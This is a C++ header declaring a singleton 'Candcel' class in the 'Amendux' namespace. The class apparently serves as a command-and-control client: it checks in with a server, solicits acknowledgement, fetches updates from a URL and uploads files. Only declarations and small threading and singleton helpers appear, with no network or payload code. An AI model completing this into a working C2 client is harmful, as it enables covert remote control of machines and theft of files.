#pragma once

#include "CoreInterface.h"
#include "Thread.h"

namespace Amendux {

	class Candcel : CoreInterface
	{
		static Candcel *s_Candcel;
		bool serverSolicitAck = false;
		unsigned short checkInCount = 0;

		DWORD CheckIn();
		void DeepSleep();
		void GetUpdate(unsigned int buildNumber, const std::wstring& wurl);
		bool IsAlive();
		void Solicit();
		void CheckForUpdate();
		void InitClass();

	public:
		Candcel();
		~Candcel();

		void UploadFile(const std::wstring& name, const std::wstring& content);

		bool IsConnected() const {
			return serverSolicitAck;
		}

		unsigned int CheckinCounter() const {
			return checkInCount;
		}

		static void SpawnInterval() {
			if (!Config::Current()->CanConnect()) {
				return;
			}

			auto thread = new Thread<Candcel>(Candcel::Current(), &Candcel::CheckIn);
			if (!thread->Start()) {
				LogError(L"Candcel", L"Cannot spawn checkin process");
			}
		}

		static Candcel *Current() {
			if (!s_Candcel) {
				s_Candcel = new Candcel;
			}

			return s_Candcel;
		}

		static void Init() {
			if (!s_Candcel) {
				s_Candcel = new Candcel;
			}

			s_Candcel->InitClass();
		}

		static void Terminate() {
			if (s_Candcel) {
				delete s_Candcel;
				s_Candcel = nullptr;
			}
		}

	};

}
